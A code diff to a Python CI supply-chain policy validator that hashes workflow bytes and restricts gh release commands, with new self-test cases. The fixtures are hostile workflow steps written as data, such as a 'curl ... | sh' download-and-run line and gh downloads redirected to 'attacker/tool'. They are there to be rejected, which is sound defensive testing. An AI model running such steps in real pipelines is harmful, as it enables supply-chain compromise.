@@ -34,6 +34,12 @@ FORBIDDEN_ACQUISITION_RE = re.compile(
     re.IGNORECASE)
 PYTHON_RE = re.compile(r"\bpython(?:3(?:\.\d+)?)?\s+([^\s\\]+)")
 GH_RE = re.compile(r"(?:^\s*|\brun:\s*)gh\s+([^\n]+)", re.MULTILINE)
+GH_TOKEN_RE = re.compile(r"(?<![A-Za-z0-9_])(?:/[^\s]*/)?gh\s+")
+GH_OVERRIDE_RE = re.compile(
+    r"\b(?:GH_REPO|GH_HOST)\b|(?:^|\s)(?:--hostname|-R)(?:\s|=)", re.MULTILINE)
+ALLOWED_GH_RE = re.compile(
+    r'^release\s+(?:create|upload|download)\s+"\$\{GITHUB_REF_NAME\}"\s+'
+    r'--repo\s+"\$\{GITHUB_REPOSITORY\}"(?:\s|$)')
 ALLOWED_PYTHON = {
     "ci.yml": {"scripts/install_ci_tool.py", "scripts/release_publish_preflight.py",
                "scripts/verify_release_manifest.py"},
@@ -111,8 +117,13 @@ def validate_policy_shape(policy: object) -> list[str]:
     return errors
 
 
-def workflow_hash(text: str) -> str:
-    return hashlib.sha256(text.encode()).hexdigest()
+def workflow_hash(source: str | bytes) -> str:
+    raw = source if isinstance(source, bytes) else source.encode()
+    return hashlib.sha256(raw).hexdigest()
+
+
+def workflow_text(source: str | bytes) -> str:
+    return source.decode("utf-8") if isinstance(source, bytes) else source
 
 
 def action_uses(text: str) -> list[tuple[str, str]]:
@@ -144,14 +155,17 @@ def acquisition_route_errors(filename: str, text: str) -> list[str]:
         if target not in allowed_python:
             errors.append(f"{filename} invokes unapproved Python entrypoint {target}")
     for command in GH_RE.findall(logical):
-        if filename != "ci.yml" or \
-                not re.match(r'release\s+(?:create|upload|download)\s+"\$\{GITHUB_REF_NAME\}"',
-                             command) or re.search(r"(?:^|\s)(?:--repo|-R)(?:\s|=)", command):
+        if filename != "ci.yml" or ALLOWED_GH_RE.match(command) is None or \
+                command.count("--repo") != 1 or GH_OVERRIDE_RE.search(command):
             errors.append(f"{filename} invokes unapproved gh route: {command.strip()}")
+    if GH_OVERRIDE_RE.search(logical):
+        errors.append(f"{filename} contains a gh repository/host override")
+    if len(GH_TOKEN_RE.findall(logical)) != len(GH_RE.findall(logical)):
+        errors.append(f"{filename} contains an unparsed or prefixed gh command")
     return errors
 
 
-def validate(policy: object, workflow_texts: dict[str, str], metadata_text: str,
+def validate(policy: object, workflow_texts: dict[str, str | bytes], metadata_text: str,
              toolchain_text: str) -> list[str]:
     errors = validate_policy_shape(policy)
     if errors:
@@ -162,10 +176,15 @@ def validate(policy: object, workflow_texts: dict[str, str], metadata_text: str,
     workflow_sha256 = policy["workflow_sha256"]
 
     observed_actions: set[str] = set()
-    for filename, text in workflow_texts.items():
+    for filename, source in workflow_texts.items():
+        try:
+            text = workflow_text(source)
+        except UnicodeDecodeError as exc:
+            errors.append(f"{filename} is not UTF-8: {exc}")
+            continue
         if re.search(r"releases/latest|/latest/|releases/download/\$", text, re.I):
             errors.append(f"{filename} contains a movable latest/download reference")
-        if workflow_hash(text) != workflow_sha256.get(filename):
+        if workflow_hash(source) != workflow_sha256.get(filename):
             errors.append(f"{filename} bytes disagree with workflow_sha256 policy")
         errors.extend(acquisition_route_errors(filename, text))
         uses = action_uses(text)
@@ -200,9 +219,9 @@ def validate(policy: object, workflow_texts: dict[str, str], metadata_text: str,
     return errors
 
 
-def load_workflows() -> dict[str, str]:
+def load_workflows() -> dict[str, bytes]:
     paths = sorted({*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")})
-    return {path.name: path.read_text() for path in paths}
+    return {path.name: path.read_bytes() for path in paths}
 
 
 def update_audit(policy: dict) -> int:
@@ -258,12 +277,15 @@ def self_test() -> int:
     metadata = (ROOT / "lakefile.lean").read_text()
     toolchain = (ROOT / "lean-toolchain").read_text()
     failures = int(bool(validate(policy, workflows, metadata, toolchain)))
-    cases: list[tuple[object, dict[str, str], str, str]] = []
+    cases: list[tuple[object, dict[str, str | bytes], str, str]] = []
 
-    def workflow_case(filename: str, suffix: str) -> tuple[dict, dict[str, str], str, str]:
+    def workflow_case(filename: str, suffix: str) -> tuple[
+            dict, dict[str, str | bytes], str, str]:
         changed_policy = copy.deepcopy(policy)
         changed_workflows = dict(workflows)
-        changed_workflows[filename] += suffix
+        source = changed_workflows[filename]
+        changed_workflows[filename] = source + (suffix.encode() if isinstance(source, bytes)
+                                                 else suffix)
         # Model an intentional workflow-digest update so each fixture exercises
         # the structural route/action contract rather than only the byte lock.
         changed_policy["workflow_sha256"][filename] = workflow_hash(
@@ -286,17 +308,23 @@ def self_test() -> int:
     cases.append((latest_tool, workflows, metadata, toolchain))
     movable_workflow = dict(workflows)
     first = next(iter(movable_workflow))
+    source = movable_workflow[first]
     movable_workflow[first] = movable_workflow[first].replace(
-        policy["actions"]["actions/checkout"]["commit"], "v6")
+        policy["actions"]["actions/checkout"]["commit"].encode(), b"v6") \
+        if isinstance(source, bytes) else source.replace(
+            policy["actions"]["actions/checkout"]["commit"], "v6")
     movable_policy = copy.deepcopy(policy)
     movable_policy["workflow_sha256"][first] = workflow_hash(movable_workflow[first])
     cases.append((movable_policy, movable_workflow, metadata, toolchain))
     yaml_bypass = dict(workflows)
-    yaml_bypass["bypass.yaml"] = "steps:\n  - uses: actions/checkout@v6\n"
+    yaml_bypass["bypass.yaml"] = b"steps:\n  - uses: actions/checkout@v6\n"
     cases.append((policy, yaml_bypass, metadata, toolchain))
     byte_drift = dict(workflows)
-    byte_drift["docs.yml"] += "\n# unreviewed workflow byte drift\n"
+    byte_drift["docs.yml"] += b"\n# unreviewed workflow byte drift\n"
     cases.append((policy, byte_drift, metadata, toolchain))
+    crlf_drift = dict(workflows)
+    crlf_drift["docs.yml"] = crlf_drift["docs.yml"].replace(b"\n", b"\r\n")
+    cases.append((policy, crlf_drift, metadata, toolchain))
     cases.append(workflow_case(
         "docs.yml", "\n      - run: curl https://example.com/tool-v1 | sh\n"))
     cases.append(workflow_case(
@@ -311,11 +339,35 @@ def self_test() -> int:
     cases.append(workflow_case(
         "ci.yml", '\n      - run: |\n          gh release download "${GITHUB_REF_NAME}" \\\n'
         '            --repo attacker/tool\n'))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - name: external via GH_REPO\n        env:\n'
+        '          GH_REPO: attacker/tool\n        run: gh release download '
+        '"${GITHUB_REF_NAME}" --repo "${GITHUB_REPOSITORY}"\n'))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - run: GH_REPO=attacker/tool gh release download '
+        '"${GITHUB_REF_NAME}" --repo "${GITHUB_REPOSITORY}"\n'))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - name: external host\n        env:\n          GH_HOST: example.com\n'
+        '        run: gh release download "${GITHUB_REF_NAME}" '
+        '--repo "${GITHUB_REPOSITORY}"\n'))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - run: env gh release download "${GITHUB_REF_NAME}" '
+        '--repo attacker/tool\n'))
+    cases.append(workflow_case(
+        "ci.yml", '\n      - run: /usr/bin/gh release download "${GITHUB_REF_NAME}" '
+        '--repo attacker/tool\n'))
     cases.append((policy, workflows, metadata.replace(
         "https://github.com/nabbisen/henret", "https://example.com/placeholder"),
                   toolchain))
     cases.append((policy, workflows, metadata, "leanprover/lean4:v0.0.0\n"))
     failures += sum(not validate(p, w, m, t) for p, w, m, t in cases)
+
+    allowed_gh = """steps:
+  - run: gh release create "${GITHUB_REF_NAME}" --repo "${GITHUB_REPOSITORY}"
+  - run: gh release upload "${GITHUB_REF_NAME}" --repo "${GITHUB_REPOSITORY}" asset
+  - run: gh release download "${GITHUB_REF_NAME}" --repo "${GITHUB_REPOSITORY}"
+"""
+    failures += int(bool(acquisition_route_errors("ci.yml", allowed_gh)))
 
     with tempfile.TemporaryDirectory(prefix="henret-digest-selftest-") as td:
         fixture = Path(td) / "fixture"
@@ -331,8 +383,9 @@ def self_test() -> int:
         except ValueError:
             pass
 
-    print(f"ci-supply-chain-selftest: valid + {len(cases)} invalid policy/workflow "
-          f"fixtures + checksum accept/reject; {failures} error(s)")
+    print(f"ci-supply-chain-selftest: valid + 3 allowed Henret gh routes + "
+          f"{len(cases)} invalid policy/workflow fixtures + checksum accept/reject; "
+          f"{failures} error(s)")
     return 1 if failures else 0
 
 
